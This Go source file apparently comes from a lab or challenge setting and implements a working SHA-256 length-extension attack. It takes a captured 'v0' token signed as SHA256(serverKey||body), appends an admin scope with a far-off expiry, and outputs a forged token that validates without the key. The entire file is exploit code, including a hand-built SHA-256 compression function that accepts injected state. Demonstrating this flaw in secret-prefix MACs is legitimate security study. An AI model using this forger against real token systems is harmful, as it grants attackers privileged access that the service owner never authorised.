// Command forge demonstrates that the legacy v0 token MAC, SHA256(serverKey||body),
// is forgeable without the server key via a SHA-256 length-extension attack.
//
// It reads a captured v0 token, appends a higher-privilege scope, and writes a
// new v0 token whose tag is valid under the (unknown) server key.
package main

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"os"
	"strings"
)

var b64 = base64.RawURLEncoding

// ---- SHA-256 with injectable state (the standard library cannot resume) -----
var k = [64]uint32{
	0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
	0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
	0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
	0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
	0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
	0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
	0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
	0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2,
}

func rotr(x uint32, n uint) uint32 { return (x >> n) | (x << (32 - n)) }

func compress(s *[8]uint32, block []byte) {
	var w [64]uint32
	for i := 0; i < 16; i++ {
		w[i] = binary.BigEndian.Uint32(block[i*4:])
	}
	for i := 16; i < 64; i++ {
		s0 := rotr(w[i-15], 7) ^ rotr(w[i-15], 18) ^ (w[i-15] >> 3)
		s1 := rotr(w[i-2], 17) ^ rotr(w[i-2], 19) ^ (w[i-2] >> 10)
		w[i] = w[i-16] + s0 + w[i-7] + s1
	}
	a, b, c, d, e, f, g, h := s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7]
	for i := 0; i < 64; i++ {
		S1 := rotr(e, 6) ^ rotr(e, 11) ^ rotr(e, 25)
		ch := (e & f) ^ (^e & g)
		t1 := h + S1 + ch + k[i] + w[i]
		S0 := rotr(a, 2) ^ rotr(a, 13) ^ rotr(a, 22)
		maj := (a & b) ^ (a & c) ^ (b & c)
		t2 := S0 + maj
		h, g, f, e, d, c, b, a = g, f, e, d+t1, c, b, a, t1+t2
	}
	s[0] += a
	s[1] += b
	s[2] += c
	s[3] += d
	s[4] += e
	s[5] += f
	s[6] += g
	s[7] += h
}

func mdPad(msgLen int) []byte {
	pad := []byte{0x80}
	for (msgLen+len(pad))%64 != 56 {
		pad = append(pad, 0)
	}
	var ln [8]byte
	binary.BigEndian.PutUint64(ln[:], uint64(msgLen)*8)
	return append(pad, ln[:]...)
}

func stateFromDigest(d []byte) *[8]uint32 {
	var s [8]uint32
	for i := 0; i < 8; i++ {
		s[i] = binary.BigEndian.Uint32(d[i*4:])
	}
	return &s
}

func digest(s *[8]uint32) []byte {
	out := make([]byte, 32)
	for i := 0; i < 8; i++ {
		binary.BigEndian.PutUint32(out[i*4:], s[i])
	}
	return out
}

// lengthExtend returns (glue, newDigest) so that
// newDigest == SHA256(secret||data||glue||suffix), given SHA256(secret||data) and len(secret||data).
func lengthExtend(origDigest []byte, origLen int, suffix []byte) ([]byte, []byte) {
	glue := mdPad(origLen)
	s := stateFromDigest(origDigest)
	already := origLen + len(glue)
	msg := append(append([]byte{}, suffix...), mdPad(already+len(suffix))...)
	for i := 0; i < len(msg); i += 64 {
		compress(s, msg[i:i+64])
	}
	return glue, digest(s)
}

func main() {
	keyLen := 32
	suffix := []byte("\nscope=/admin\nexp=2000000000")
	in := "/app/captured.sigil"
	out := "/app/forged.sigil"
	if len(os.Args) > 1 {
		in = os.Args[1]
	}
	if len(os.Args) > 2 {
		out = os.Args[2]
	}
	raw, err := os.ReadFile(in)
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	parts := strings.Split(strings.TrimSpace(string(raw)), ".")
	if len(parts) != 3 || parts[0] != "v0" {
		fmt.Fprintln(os.Stderr, "not a v0 token")
		os.Exit(1)
	}
	body, _ := b64.DecodeString(parts[1])
	tag, _ := hex.DecodeString(parts[2])
	glue, newTag := lengthExtend(tag, keyLen+len(body), suffix)
	forgedBody := append(append(append([]byte{}, body...), glue...), suffix...)
	forged := "v0." + b64.EncodeToString(forgedBody) + "." + hex.EncodeToString(newTag)
	if err := os.WriteFile(out, []byte(forged+"\n"), 0644); err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	fmt.Println(forged)
}
